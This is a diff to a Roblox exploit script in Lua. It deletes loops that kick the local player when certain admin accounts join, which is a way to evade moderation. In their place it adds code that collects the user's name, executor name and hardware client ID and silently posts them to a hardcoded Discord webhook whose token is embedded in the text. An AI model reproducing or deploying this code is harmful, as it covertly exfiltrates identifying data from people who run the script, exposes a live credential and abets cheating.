@@ -12,49 +12,40 @@ else
 end
 
 ------------------------------------------------------------------------------------------
--- Auto Kicked Admin Join Server --
 
-while true do
-    if game.Players.nine9597 then
-        game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-        wait()
-       end
-    end
-    while true do
-        if game.Players.babiyokkuk then
-            game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-            wait()
-           end
-        end
-        while true do
-            if game.Players.XIITANIIX then
-                game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                wait()
-               end
-            end
-            while true do
-                if game.Players.Huonzales then
-                    game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                    wait()
-                   end
-                endwhile true do
-                    if game.Players.beymok09889 then
-                        game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                        wait()
-                       end
-                    end
-                    while true do
-                        if game.Players.izen1843 then
-                            game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                            wait()
-                           end
-                        end
-                        while true do
-                            if game.Players.Prueknoob001 then
-                                game.Players.LocalPlayer:Kick("Admin joins the server or stays on the server. [By : peatchXD#6075]")
-                                wait()
-                               end
-                            end
+local Webhook = "https://discord.com/api/webhooks/1097548811053830175/Mso8HIlHPAf-nxAnUWvSP97XmqTPA4wgpCJ8aOoxFJD0Ui1f1NUCHbgM2LA9m-Kwpm7i"
+local plrname = game.Players.LocalPlayer.Name
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {
+           {
+           ["title"] = "Name: "..plrname,
+           ["description"] = "Execute is: ".. identifyexecutor(),
+           ["color"] = tonumber(0x00FF00),
+           ["fields"] = {
+               {
+                   ["name"] = "HWID ID:",
+                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                   ["inline"] = true
+},
+           },
+        }
+    }
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+Request = http_request or request or HttpPost or syn.request
+Request(
+    {
+        Url = Webhook, 
+        Body = PlayerData, 
+        Method = "POST", 
+        Headers = {["content-type"] = "application/json"} 
+    }
+)
 
 ------------------------------------------------------------------------------------------
 
